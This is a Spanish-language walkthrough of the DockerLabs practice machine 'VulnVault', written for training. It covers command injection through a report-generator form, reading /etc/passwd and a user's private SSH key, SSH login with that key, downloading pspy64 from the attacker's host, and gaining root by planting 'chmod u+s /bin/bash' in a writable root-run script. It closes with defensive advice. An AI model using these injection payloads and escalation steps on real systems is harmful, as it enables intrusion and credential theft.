# VulnVault — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 25/08/2024  
**Técnicas:** Command Injection · File Read · SSH Key Disclosure · SSH · pspy64 · SUID abuse · bash -p

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Command Injection](#2-enumeración-web--command-injection)
3. [Obtención de clave privada SSH](#3-obtención-de-clave-privada-ssh)
4. [Acceso SSH — usuario samara](#4-acceso-ssh--usuario-samara)
5. [Enumeración interna — pspy64](#5-enumeración-interna--pspy64)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos el laboratorio:

```bash
sudo bash auto_deploy.sh vulnvault.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo inicial:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Enumeramos versiones y servicios:

```bash
nmap -p22,80 -sCV -Pn 172.17.0.2
```

Resultado:

```text
OpenSSH 9.6p1 Ubuntu
Apache httpd 2.4.58 ((Ubuntu))
```

El sitio web corresponde a:

```text
Generador de Reportes - Centro de Operaciones
```

---

## 2. Enumeración web — Command Injection

La aplicación permite generar reportes indicando un nombre de archivo y una fecha.

Probamos subiendo un fichero PHP, pero únicamente genera un `.txt` y no ejecuta código.

Intentamos inyección de comandos:

```bash
; ls -la
```

La aplicación ejecuta correctamente el comando.

Resultado:

```text
index.php
upload.php
reportes/
```

La aplicación es vulnerable a **Command Injection**.

Leemos `/etc/passwd`:

```bash
; cat /etc/passwd
```

Resultado relevante:

```text
samara:x:1001:1001::/home/samara:/bin/bash
```

Exploramos el directorio del usuario:

```bash
; ls -la /home/samara
```

Encontramos:

```text
message.txt
user.txt
.ssh/
```

Intentamos leer:

```bash
; cat /home/samara/user.txt
```

Resultado:

```text
Permission denied
```

Probamos el otro fichero:

```bash
; cat /home/samara/message.txt
```

Resultado:

```text
No tienes permitido estar aqui :(
```

---

## 3. Obtención de clave privada SSH

Exploramos el directorio `.ssh`:

```bash
; ls -la /home/samara/.ssh
```

Resultado:

```text
authorized_keys
id_rsa
id_rsa.pub
```

Leemos la clave privada:

```bash
; cat /home/samara/.ssh/id_rsa
```

Copiamos el contenido en nuestro equipo:

```bash
nano id_rsa
```

Asignamos permisos correctos:

```bash
chmod 600 id_rsa
```

---

## 4. Acceso SSH — usuario samara

Accedemos mediante SSH:

```bash
ssh -i id_rsa samara@172.17.0.2
```

Acceso correcto.

Intentamos usar sudo:

```bash
sudo -l
```

Resultado:

```text
sudo: command not found
```

Buscamos binarios SUID:

```bash
find / -perm -4000 -user root 2>/dev/null
```

No encontramos nada explotable.

---

## 5. Enumeración interna — pspy64

Descargamos `pspy64` en nuestra máquina local y compartimos el archivo:

```bash
sudo python3 -m http.server 80
```

En la máquina víctima descargamos:

```bash
wget http://192.168.1.26/pspy64
```

Damos permisos:

```bash
chmod +x pspy64
```

Ejecutamos la herramienta:

```bash
./pspy64
```

Observamos un proceso ejecutado constantemente por root:

```text
/bin/bash /usr/local/bin/echo.sh
```

Exploramos el directorio:

```bash
cd /usr/local/bin
ls -la
```

Resultado:

```text
echo.sh
generate_report
```

El script `echo.sh` es escribible.

---

## 6. Escalada de privilegios

Modificamos el script para activar el bit SUID sobre `/bin/bash`.

Payload:

```bash
chmod u+s /bin/bash
```

Esperamos a que root ejecute automáticamente el script.

Verificamos permisos:

```bash
ls -la /bin/bash
```

Resultado:

```text
-rwsr-xr-x
```

Ejecutamos Bash preservando privilegios:

```bash
bash -p
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Command Injection | Ejecución arbitraria de comandos |
| Exposición de clave privada SSH | Acceso remoto |
| Script ejecutado automáticamente por root | Escalada de privilegios |
| Activación del bit SUID sobre bash | Acceso root persistente |

**Para defenderse:**

- Validar correctamente entradas de usuario.
- No almacenar claves privadas accesibles.
- Restringir permisos sobre scripts ejecutados por root.
- Monitorizar cambios inseguros en binarios críticos.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
